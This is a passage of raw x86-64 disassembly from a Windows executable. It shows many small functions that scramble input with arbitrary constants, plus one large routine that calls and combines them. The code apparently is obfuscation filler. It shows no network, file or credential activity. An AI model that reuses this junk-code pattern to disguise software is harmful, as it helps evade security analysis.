   140003d15:	83 6c 24 08 01       	subl   $0x1,0x8(%rsp)
   140003d1a:	eb cb                	jmp    0x140003ce7
   140003d1c:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140003d20:	48 83 c4 28          	add    $0x28,%rsp
   140003d24:	c3                   	ret
   140003d25:	48 83 ec 28          	sub    $0x28,%rsp
   140003d29:	85 c9                	test   %ecx,%ecx
   140003d2b:	74 46                	je     0x140003d73
   140003d2d:	81 e1 ff 00 00 00    	and    $0xff,%ecx
   140003d33:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140003d37:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%rsp)
   140003d3e:	00 
   140003d3f:	83 7c 24 08 00       	cmpl   $0x0,0x8(%rsp)
   140003d44:	7e 2d                	jle    0x140003d73
   140003d46:	c7 44 24 10 04 00 00 	movl   $0x4,0x10(%rsp)
   140003d4d:	00 
   140003d4e:	83 7c 24 10 00       	cmpl   $0x0,0x10(%rsp)
   140003d53:	7e 17                	jle    0x140003d6c
   140003d55:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140003d59:	33 44 24 10          	xor    0x10(%rsp),%eax
   140003d5d:	33 44 24 08          	xor    0x8(%rsp),%eax
   140003d61:	89 44 24 0c          	mov    %eax,0xc(%rsp)
   140003d65:	83 6c 24 10 01       	subl   $0x1,0x10(%rsp)
   140003d6a:	eb e2                	jmp    0x140003d4e
   140003d6c:	83 6c 24 08 01       	subl   $0x1,0x8(%rsp)
   140003d71:	eb cc                	jmp    0x140003d3f
   140003d73:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140003d77:	48 83 c4 28          	add    $0x28,%rsp
   140003d7b:	c3                   	ret
   140003d7c:	89 c8                	mov    %ecx,%eax
   140003d7e:	c1 e8 18             	shr    $0x18,%eax
   140003d81:	83 e0 0f             	and    $0xf,%eax
   140003d84:	83 f8 0b             	cmp    $0xb,%eax
   140003d87:	75 06                	jne    0x140003d8f
   140003d89:	0d 00 00 00 80       	or     $0x80000000,%eax
   140003d8e:	c3                   	ret
   140003d8f:	83 e0 07             	and    $0x7,%eax
   140003d92:	c3                   	ret
   140003d93:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140003d9a:	72 25                	jb     0x140003dc1
   140003d9c:	48 81 fa 00 00 01 00 	cmp    $0x10000,%rdx
   140003da3:	72 1c                	jb     0x140003dc1
   140003da5:	44 0f b6 01          	movzbl (%rcx),%r8d
   140003da9:	44 0f b6 0a          	movzbl (%rdx),%r9d
   140003dad:	45 38 c8             	cmp    %r9b,%r8b
   140003db0:	7c 05                	jl     0x140003db7
   140003db2:	7f 07                	jg     0x140003dbb
   140003db4:	31 c0                	xor    %eax,%eax
   140003db6:	c3                   	ret
   140003db7:	83 c8 ff             	or     $0xffffffff,%eax
   140003dba:	c3                   	ret
   140003dbb:	b8 01 00 00 00       	mov    $0x1,%eax
   140003dc0:	c3                   	ret
   140003dc1:	b8 57 00 07 80       	mov    $0x80070057,%eax
   140003dc6:	c3                   	ret
   140003dc7:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140003dce:	72 25                	jb     0x140003df5
   140003dd0:	48 81 fa 00 00 01 00 	cmp    $0x10000,%rdx
   140003dd7:	72 1c                	jb     0x140003df5
   140003dd9:	44 0f b6 01          	movzbl (%rcx),%r8d
   140003ddd:	44 0f b6 0a          	movzbl (%rdx),%r9d
   140003de1:	45 38 c8             	cmp    %r9b,%r8b
   140003de4:	7c 05                	jl     0x140003deb
   140003de6:	7f 07                	jg     0x140003def
   140003de8:	31 c0                	xor    %eax,%eax
   140003dea:	c3                   	ret
   140003deb:	83 c8 ff             	or     $0xffffffff,%eax
   140003dee:	c3                   	ret
   140003def:	b8 01 00 00 00       	mov    $0x1,%eax
   140003df4:	c3                   	ret
   140003df5:	b8 57 00 07 80       	mov    $0x80070057,%eax
   140003dfa:	c3                   	ret
   140003dfb:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140003e02:	72 0e                	jb     0x140003e12
   140003e04:	0f b6 01             	movzbl (%rcx),%eax
   140003e07:	25 96 4b 97 00       	and    $0x974b96,%eax
   140003e0c:	25 27 11 23 00       	and    $0x231127,%eax
   140003e11:	c3                   	ret
   140003e12:	83 c8 ff             	or     $0xffffffff,%eax
   140003e15:	c3                   	ret
   140003e16:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140003e1d:	72 14                	jb     0x140003e33
   140003e1f:	0f b7 01             	movzwl (%rcx),%eax
   140003e22:	69 c0 94 00 00 00    	imul   $0x94,%eax,%eax
   140003e28:	35 c6 49 c7 00       	xor    $0xc749c6,%eax
   140003e2d:	35 77 04 73 00       	xor    $0x730477,%eax
   140003e32:	c3                   	ret
   140003e33:	83 c8 ff             	or     $0xffffffff,%eax
   140003e36:	c3                   	ret
   140003e37:	89 c8                	mov    %ecx,%eax
   140003e39:	c1 e8 18             	shr    $0x18,%eax
   140003e3c:	25 ff ff 00 00       	and    $0xffff,%eax
   140003e41:	3d 96 a0 00 00       	cmp    $0xa096,%eax
   140003e46:	75 06                	jne    0x140003e4e
   140003e48:	0d 00 02 00 00       	or     $0x200,%eax
   140003e4d:	c3                   	ret
   140003e4e:	25 ff 7f 00 00       	and    $0x7fff,%eax
   140003e53:	c3                   	ret
   140003e54:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140003e5b:	73 07                	jae    0x140003e64
   140003e5d:	48 8d 0d 11 0b 00 00 	lea    0xb11(%rip),%rcx        # 0x140004975
   140003e64:	31 c0                	xor    %eax,%eax
   140003e66:	41 ba 00 01 00 00    	mov    $0x100,%r10d
   140003e6c:	45 85 d2             	test   %r10d,%r10d
   140003e6f:	74 1a                	je     0x140003e8b
   140003e71:	41 83 ea 01          	sub    $0x1,%r10d
   140003e75:	0f b7 11             	movzwl (%rcx),%edx
   140003e78:	66 85 d2             	test   %dx,%dx
   140003e7b:	74 0e                	je     0x140003e8b
   140003e7d:	66 83 fa 2e          	cmp    $0x2e,%dx
   140003e81:	75 02                	jne    0x140003e85
   140003e83:	ff c0                	inc    %eax
   140003e85:	48 83 c1 02          	add    $0x2,%rcx
   140003e89:	eb e1                	jmp    0x140003e6c
   140003e8b:	c3                   	ret
   140003e8c:	48 83 ec 28          	sub    $0x28,%rsp
   140003e90:	31 c9                	xor    %ecx,%ecx
   140003e92:	ff 15 34 87 d6 05    	call   *0x5d68734(%rip)        # 0x145d6c5cc
   140003e98:	48 85 c0             	test   %rax,%rax
   140003e9b:	74 0e                	je     0x140003eab
   140003e9d:	48 89 c2             	mov    %rax,%rdx
   140003ea0:	48 c1 e8 20          	shr    $0x20,%rax
   140003ea4:	31 d0                	xor    %edx,%eax
   140003ea6:	48 83 c4 28          	add    $0x28,%rsp
   140003eaa:	c3                   	ret
   140003eab:	83 c8 ff             	or     $0xffffffff,%eax
   140003eae:	48 83 c4 28          	add    $0x28,%rsp
   140003eb2:	c3                   	ret
   140003eb3:	48 83 ec 28          	sub    $0x28,%rsp
   140003eb7:	85 c9                	test   %ecx,%ecx
   140003eb9:	74 47                	je     0x140003f02
   140003ebb:	81 e1 ff 00 00 00    	and    $0xff,%ecx
   140003ec1:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140003ec5:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%rsp)
   140003ecc:	00 
   140003ecd:	83 7c 24 08 00       	cmpl   $0x0,0x8(%rsp)
   140003ed2:	7e 2e                	jle    0x140003f02
   140003ed4:	c7 44 24 10 03 00 00 	movl   $0x3,0x10(%rsp)
   140003edb:	00 
   140003edc:	83 7c 24 10 00       	cmpl   $0x0,0x10(%rsp)
   140003ee1:	7e 18                	jle    0x140003efb
   140003ee3:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140003ee7:	0f af 44 24 10       	imul   0x10(%rsp),%eax
   140003eec:	03 44 24 08          	add    0x8(%rsp),%eax
   140003ef0:	89 44 24 0c          	mov    %eax,0xc(%rsp)
   140003ef4:	83 6c 24 10 01       	subl   $0x1,0x10(%rsp)
   140003ef9:	eb e1                	jmp    0x140003edc
   140003efb:	83 6c 24 08 01       	subl   $0x1,0x8(%rsp)
   140003f00:	eb cb                	jmp    0x140003ecd
   140003f02:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140003f06:	48 83 c4 28          	add    $0x28,%rsp
   140003f0a:	c3                   	ret
   140003f0b:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140003f12:	73 07                	jae    0x140003f1b
   140003f14:	48 8d 0d ed 0a 00 00 	lea    0xaed(%rip),%rcx        # 0x140004a08
   140003f1b:	31 c0                	xor    %eax,%eax
   140003f1d:	41 ba 00 01 00 00    	mov    $0x100,%r10d
   140003f23:	45 85 d2             	test   %r10d,%r10d
   140003f26:	74 1a                	je     0x140003f42
   140003f28:	41 83 ea 01          	sub    $0x1,%r10d
   140003f2c:	0f b7 11             	movzwl (%rcx),%edx
   140003f2f:	66 85 d2             	test   %dx,%dx
   140003f32:	74 0e                	je     0x140003f42
   140003f34:	66 83 fa 2e          	cmp    $0x2e,%dx
   140003f38:	75 02                	jne    0x140003f3c
   140003f3a:	ff c0                	inc    %eax
   140003f3c:	48 83 c1 02          	add    $0x2,%rcx
   140003f40:	eb e1                	jmp    0x140003f23
   140003f42:	c3                   	ret
   140003f43:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140003f4a:	72 0e                	jb     0x140003f5a
   140003f4c:	0f b7 01             	movzwl (%rcx),%eax
   140003f4f:	25 1e 8b d6 00       	and    $0xd68b1e,%eax
   140003f54:	0d df cd dd 00       	or     $0xddcddf,%eax
   140003f59:	c3                   	ret
   140003f5a:	b8 05 40 00 80       	mov    $0x80004005,%eax
   140003f5f:	c3                   	ret
   140003f60:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140003f67:	73 07                	jae    0x140003f70
   140003f69:	48 8d 0d cf 09 00 00 	lea    0x9cf(%rip),%rcx        # 0x14000493f
   140003f70:	31 c0                	xor    %eax,%eax
   140003f72:	41 ba 00 01 00 00    	mov    $0x100,%r10d
   140003f78:	45 85 d2             	test   %r10d,%r10d
   140003f7b:	74 17                	je     0x140003f94
   140003f7d:	41 83 ea 01          	sub    $0x1,%r10d
   140003f81:	0f b6 11             	movzbl (%rcx),%edx
   140003f84:	84 d2                	test   %dl,%dl
   140003f86:	74 0c                	je     0x140003f94
   140003f88:	80 fa 3d             	cmp    $0x3d,%dl
   140003f8b:	75 02                	jne    0x140003f8f
   140003f8d:	ff c0                	inc    %eax
   140003f8f:	48 ff c1             	inc    %rcx
   140003f92:	eb e4                	jmp    0x140003f78
   140003f94:	c3                   	ret
   140003f95:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140003f9c:	72 14                	jb     0x140003fb2
   140003f9e:	0f b6 01             	movzbl (%rcx),%eax
   140003fa1:	69 c0 ec 00 00 00    	imul   $0xec,%eax,%eax
   140003fa7:	0d 36 ee f1 00       	or     $0xf1ee36,%eax
   140003fac:	05 87 83 9d 00       	add    $0x9d8387,%eax
   140003fb1:	c3                   	ret
   140003fb2:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   140003fb7:	c3                   	ret
   140003fb8:	48 83 ec 28          	sub    $0x28,%rsp
   140003fbc:	85 c9                	test   %ecx,%ecx
   140003fbe:	74 46                	je     0x140004006
   140003fc0:	81 e1 ff 00 00 00    	and    $0xff,%ecx
   140003fc6:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140003fca:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%rsp)
   140003fd1:	00 
   140003fd2:	83 7c 24 08 00       	cmpl   $0x0,0x8(%rsp)
   140003fd7:	7e 2d                	jle    0x140004006
   140003fd9:	c7 44 24 10 07 00 00 	movl   $0x7,0x10(%rsp)
   140003fe0:	00 
   140003fe1:	83 7c 24 10 00       	cmpl   $0x0,0x10(%rsp)
   140003fe6:	7e 17                	jle    0x140003fff
   140003fe8:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   140003fec:	03 44 24 10          	add    0x10(%rsp),%eax
   140003ff0:	03 44 24 08          	add    0x8(%rsp),%eax
   140003ff4:	89 44 24 0c          	mov    %eax,0xc(%rsp)
   140003ff8:	83 6c 24 10 01       	subl   $0x1,0x10(%rsp)
   140003ffd:	eb e2                	jmp    0x140003fe1
   140003fff:	83 6c 24 08 01       	subl   $0x1,0x8(%rsp)
   140004004:	eb cc                	jmp    0x140003fd2
   140004006:	8b 44 24 0c          	mov    0xc(%rsp),%eax
   14000400a:	48 83 c4 28          	add    $0x28,%rsp
   14000400e:	c3                   	ret
   14000400f:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140004016:	73 07                	jae    0x14000401f
   140004018:	48 8d 0d 8b 09 00 00 	lea    0x98b(%rip),%rcx        # 0x1400049aa
   14000401f:	31 c0                	xor    %eax,%eax
   140004021:	41 ba 00 01 00 00    	mov    $0x100,%r10d
   140004027:	45 85 d2             	test   %r10d,%r10d
   14000402a:	74 17                	je     0x140004043
   14000402c:	41 83 ea 01          	sub    $0x1,%r10d
   140004030:	0f b6 11             	movzbl (%rcx),%edx
   140004033:	84 d2                	test   %dl,%dl
   140004035:	74 0c                	je     0x140004043
   140004037:	80 fa 20             	cmp    $0x20,%dl
   14000403a:	75 02                	jne    0x14000403e
   14000403c:	ff c0                	inc    %eax
   14000403e:	48 ff c1             	inc    %rcx
   140004041:	eb e4                	jmp    0x140004027
   140004043:	c3                   	ret
   140004044:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   14000404b:	72 13                	jb     0x140004060
   14000404d:	8b 01                	mov    (%rcx),%eax
   14000404f:	35 61 ba c1 00       	xor    $0xc1ba61,%eax
   140004054:	69 c0 9a 00 00 00    	imul   $0x9a,%eax,%eax
   14000405a:	05 b4 18 4c 00       	add    $0x4c18b4,%eax
   14000405f:	c3                   	ret
   140004060:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   140004065:	c3                   	ret
   140004066:	89 c8                	mov    %ecx,%eax
   140004068:	c1 e8 0c             	shr    $0xc,%eax
   14000406b:	83 e0 0f             	and    $0xf,%eax
   14000406e:	83 f8 0c             	cmp    $0xc,%eax
   140004071:	75 06                	jne    0x140004079
   140004073:	0d 00 01 00 00       	or     $0x100,%eax
   140004078:	c3                   	ret
   140004079:	83 e0 07             	and    $0x7,%eax
   14000407c:	c3                   	ret
   14000407d:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   140004084:	72 08                	jb     0x14000408e
   140004086:	8b 01                	mov    (%rcx),%eax
   140004088:	0d 2f 59 6b 00       	or     $0x6b592f,%eax
   14000408d:	c3                   	ret
   14000408e:	b8 01 00 00 c0       	mov    $0xc0000001,%eax
   140004093:	c3                   	ret
   140004094:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   14000409b:	72 08                	jb     0x1400040a5
   14000409d:	8b 01                	mov    (%rcx),%eax
   14000409f:	35 da 01 e4 00       	xor    $0xe401da,%eax
   1400040a4:	c3                   	ret
   1400040a5:	b8 05 40 00 80       	mov    $0x80004005,%eax
   1400040aa:	c3                   	ret
   1400040ab:	48 83 ec 28          	sub    $0x28,%rsp
   1400040af:	31 c9                	xor    %ecx,%ecx
   1400040b1:	ff 15 15 85 d6 05    	call   *0x5d68515(%rip)        # 0x145d6c5cc
   1400040b7:	48 85 c0             	test   %rax,%rax
   1400040ba:	74 05                	je     0x1400040c1
   1400040bc:	48 83 c4 28          	add    $0x28,%rsp
   1400040c0:	c3                   	ret
   1400040c1:	83 c8 ff             	or     $0xffffffff,%eax
   1400040c4:	48 83 c4 28          	add    $0x28,%rsp
   1400040c8:	c3                   	ret
   1400040c9:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   1400040d0:	72 0e                	jb     0x1400040e0
   1400040d2:	0f b7 01             	movzwl (%rcx),%eax
   1400040d5:	05 38 94 c7 00       	add    $0xc79438,%eax
   1400040da:	35 95 0d 75 00       	xor    $0x750d95,%eax
   1400040df:	c3                   	ret
   1400040e0:	83 c8 ff             	or     $0xffffffff,%eax
   1400040e3:	c3                   	ret
   1400040e4:	48 83 ec 28          	sub    $0x28,%rsp
   1400040e8:	31 c9                	xor    %ecx,%ecx
   1400040ea:	ff 15 dc 84 d6 05    	call   *0x5d684dc(%rip)        # 0x145d6c5cc
   1400040f0:	48 85 c0             	test   %rax,%rax
   1400040f3:	74 0a                	je     0x1400040ff
   1400040f5:	25 ff ff 00 00       	and    $0xffff,%eax
   1400040fa:	48 83 c4 28          	add    $0x28,%rsp
   1400040fe:	c3                   	ret
   1400040ff:	83 c8 ff             	or     $0xffffffff,%eax
   140004102:	48 83 c4 28          	add    $0x28,%rsp
   140004106:	c3                   	ret
   140004107:	48 81 f9 00 00 01 00 	cmp    $0x10000,%rcx
   14000410e:	72 4e                	jb     0x14000415e
   140004110:	48 83 ec 28          	sub    $0x28,%rsp
   140004114:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%rsp)
   14000411b:	00 
   14000411c:	48 8d 4c 24 08       	lea    0x8(%rsp),%rcx
   140004121:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004126:	e8 3b ff ff ff       	call   0x140004066
   14000412b:	31 44 24 08          	xor    %eax,0x8(%rsp)
   14000412f:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
   140004134:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004139:	e8 a6 ff ff ff       	call   0x1400040e4
   14000413e:	31 44 24 08          	xor    %eax,0x8(%rsp)
   140004142:	48 8d 4c 24 10       	lea    0x10(%rsp),%rcx
   140004147:	48 8d 54 24 18       	lea    0x18(%rsp),%rdx
   14000414c:	e8 be fe ff ff       	call   0x14000400f
   140004151:	01 44 24 08          	add    %eax,0x8(%rsp)
   140004155:	8b 44 24 08          	mov    0x8(%rsp),%eax
   140004159:	48 83 c4 28          	add    $0x28,%rsp
   14000415d:	c3                   	ret
   14000415e:	83 c8 ff             	or     $0xffffffff,%eax
   140004161:	c3                   	ret
   140004162:	89 c8                	mov    %ecx,%eax
   140004164:	c1 e8 08             	shr    $0x8,%eax
   140004167:	25 ff ff 00 00       	and    $0xffff,%eax
   14000416c:	3d 66 28 00 00       	cmp    $0x2866,%eax
   140004171:	75 06                	jne    0x140004179
   140004173:	0d 00 00 00 80       	or     $0x80000000,%eax
   140004178:	c3                   	ret
   140004179:	25 ff 7f 00 00       	and    $0x7fff,%eax
   14000417e:	c3                   	ret
   14000417f:	48 83 ec 28          	sub    $0x28,%rsp
   140004183:	31 c9                	xor    %ecx,%ecx
   140004185:	ff 15 41 84 d6 05    	call   *0x5d68441(%rip)        # 0x145d6c5cc
   14000418b:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%rsp)
   140004192:	00 
   140004193:	48 89 44 24 10       	mov    %rax,0x10(%rsp)
   140004198:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   14000419d:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400041a2:	e8 eb e5 ff ff       	call   0x140002792
   1400041a7:	01 44 24 08          	add    %eax,0x8(%rsp)
   1400041ab:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400041b0:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400041b5:	e8 0f ff ff ff       	call   0x1400040c9
   1400041ba:	01 44 24 08          	add    %eax,0x8(%rsp)
   1400041be:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400041c3:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400041c8:	e8 2a f7 ff ff       	call   0x1400038f7
   1400041cd:	31 44 24 08          	xor    %eax,0x8(%rsp)
   1400041d1:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400041d6:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400041db:	e8 87 e0 ff ff       	call   0x140002267
   1400041e0:	09 44 24 08          	or     %eax,0x8(%rsp)
   1400041e4:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400041e9:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400041ee:	e8 ad ed ff ff       	call   0x140002fa0
   1400041f3:	09 44 24 08          	or     %eax,0x8(%rsp)
   1400041f7:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400041fc:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004201:	e8 76 fb ff ff       	call   0x140003d7c
   140004206:	01 44 24 08          	add    %eax,0x8(%rsp)
   14000420a:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   14000420f:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004214:	e8 72 e1 ff ff       	call   0x14000238b
   140004219:	01 44 24 08          	add    %eax,0x8(%rsp)
   14000421d:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004222:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004227:	e8 9b fb ff ff       	call   0x140003dc7
   14000422c:	09 44 24 08          	or     %eax,0x8(%rsp)
   140004230:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004235:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   14000423a:	e8 6c fe ff ff       	call   0x1400040ab
   14000423f:	31 44 24 08          	xor    %eax,0x8(%rsp)
   140004243:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004248:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   14000424d:	e8 43 fd ff ff       	call   0x140003f95
   140004252:	09 44 24 08          	or     %eax,0x8(%rsp)
   140004256:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   14000425b:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004260:	e8 7c e2 ff ff       	call   0x1400024e1
   140004265:	31 44 24 08          	xor    %eax,0x8(%rsp)
   140004269:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   14000426e:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004273:	e8 36 f4 ff ff       	call   0x1400036ae
   140004278:	09 44 24 08          	or     %eax,0x8(%rsp)
   14000427c:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004281:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004286:	e8 28 fc ff ff       	call   0x140003eb3
   14000428b:	31 44 24 08          	xor    %eax,0x8(%rsp)
   14000428f:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004294:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004299:	e8 e0 f6 ff ff       	call   0x14000397e
   14000429e:	09 44 24 08          	or     %eax,0x8(%rsp)
   1400042a2:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400042a7:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400042ac:	e8 31 ef ff ff       	call   0x1400031e2
   1400042b1:	09 44 24 08          	or     %eax,0x8(%rsp)
   1400042b5:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400042ba:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400042bf:	e8 92 e9 ff ff       	call   0x140002c56
   1400042c4:	31 44 24 08          	xor    %eax,0x8(%rsp)
   1400042c8:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400042cd:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400042d2:	e8 1d e7 ff ff       	call   0x1400029f4
   1400042d7:	31 44 24 08          	xor    %eax,0x8(%rsp)
   1400042db:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400042e0:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400042e5:	e8 d5 e6 ff ff       	call   0x1400029bf
   1400042ea:	31 44 24 08          	xor    %eax,0x8(%rsp)
   1400042ee:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400042f3:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400042f8:	e8 7a e5 ff ff       	call   0x140002877
   1400042fd:	01 44 24 08          	add    %eax,0x8(%rsp)
   140004301:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004306:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   14000430b:	e8 83 fa ff ff       	call   0x140003d93
   140004310:	01 44 24 08          	add    %eax,0x8(%rsp)
   140004314:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004319:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   14000431e:	e8 bd ed ff ff       	call   0x1400030e0
   140004323:	01 44 24 08          	add    %eax,0x8(%rsp)
   140004327:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   14000432c:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004331:	e8 e6 e4 ff ff       	call   0x14000281c
   140004336:	01 44 24 08          	add    %eax,0x8(%rsp)
   14000433a:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   14000433f:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004344:	e8 be fd ff ff       	call   0x140004107
   140004349:	01 44 24 08          	add    %eax,0x8(%rsp)
   14000434d:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004352:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004357:	e8 71 f9 ff ff       	call   0x140003ccd
   14000435c:	01 44 24 08          	add    %eax,0x8(%rsp)
   140004360:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004365:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   14000436a:	e8 1d fb ff ff       	call   0x140003e8c
   14000436f:	31 44 24 08          	xor    %eax,0x8(%rsp)
   140004373:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004378:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   14000437d:	e8 89 fb ff ff       	call   0x140003f0b
   140004382:	31 44 24 08          	xor    %eax,0x8(%rsp)
   140004386:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   14000438b:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004390:	e8 23 fc ff ff       	call   0x140003fb8
   140004395:	01 44 24 08          	add    %eax,0x8(%rsp)
   140004399:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   14000439e:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400043a3:	e8 95 e5 ff ff       	call   0x14000293d
   1400043a8:	31 44 24 08          	xor    %eax,0x8(%rsp)
   1400043ac:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400043b1:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400043b6:	e8 81 e1 ff ff       	call   0x14000253c
   1400043bb:	01 44 24 08          	add    %eax,0x8(%rsp)
   1400043bf:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400043c4:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400043c9:	e8 77 ea ff ff       	call   0x140002e45
   1400043ce:	31 44 24 08          	xor    %eax,0x8(%rsp)
   1400043d2:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400043d7:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400043dc:	e8 63 fc ff ff       	call   0x140004044
   1400043e1:	31 44 24 08          	xor    %eax,0x8(%rsp)
   1400043e5:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400043ea:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   1400043ef:	e8 1a f3 ff ff       	call   0x14000370e
   1400043f4:	01 44 24 08          	add    %eax,0x8(%rsp)
   1400043f8:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   1400043fd:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004402:	e8 2c f2 ff ff       	call   0x140003633
   140004407:	09 44 24 08          	or     %eax,0x8(%rsp)
   14000440b:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004410:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004415:	e8 48 ea ff ff       	call   0x140002e62
   14000441a:	01 44 24 08          	add    %eax,0x8(%rsp)
   14000441e:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004423:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004428:	e8 88 e2 ff ff       	call   0x1400026b5
   14000442d:	09 44 24 08          	or     %eax,0x8(%rsp)
   140004431:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004436:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   14000443b:	e8 45 f8 ff ff       	call   0x140003c85
   140004440:	31 44 24 08          	xor    %eax,0x8(%rsp)
   140004444:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004449:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   14000444e:	e8 e4 ec ff ff       	call   0x140003137
   140004453:	01 44 24 08          	add    %eax,0x8(%rsp)
   140004457:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   14000445c:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004461:	e8 82 e3 ff ff       	call   0x1400027e8
   140004466:	09 44 24 08          	or     %eax,0x8(%rsp)
   14000446a:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   14000446f:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004474:	e8 a0 ee ff ff       	call   0x140003319
   140004479:	09 44 24 08          	or     %eax,0x8(%rsp)
   14000447d:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
   140004482:	48 8d 54 24 10       	lea    0x10(%rsp),%rdx
   140004487:	e8 6f e7 ff ff       	call   0x140002bfb
   14000448c:	01 44 24 08          	add    %eax,0x8(%rsp)
   140004490:	48 8b 4c 24 10       	mov    0x10(%rsp),%rcx
